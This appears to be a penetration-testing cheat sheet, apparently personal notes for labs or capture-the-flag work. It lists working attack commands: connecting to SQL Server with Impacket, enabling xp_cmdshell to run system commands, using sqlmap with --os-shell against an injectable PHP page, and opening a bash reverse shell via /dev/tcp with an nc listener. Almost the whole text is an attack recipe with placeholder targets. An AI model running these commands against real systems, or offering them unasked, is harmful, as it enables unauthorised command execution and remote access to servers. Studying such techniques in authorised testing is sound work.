# SQL
## Connect to SQL Server using Impacket
  mssqlclient.py [username]/sql_svc@[IP] -windows-auth
## Check privs
  SELECT IS_SRVROLEMEMBER ('sysadmin')
## Enable xp_cmdshell
  EXEC sp_configure 'Show Advanced Options', 1;

  reconfigure;

  sp_configure;

  EXEC sp_configure 'xp_cmdshell', 1

  reconfigure;

  xp_cmdshell "whoami"

## sqlmap query (postgreSQL)
`sqlmap -u 'http://IP/directory.php?search=input' --cookie="PHPSESSID=cookieID"`

## If vulnerable to injection

`sqlmap -u 'http://IP/directory.php?search=input' --cookie="PHPSESSID=cookieID" --os-shell`

## Execute bash reverse shell

`bash -c 'bash -i >& /dev/tcp/IP/port 0>&1'`

`nc -lvnp port`


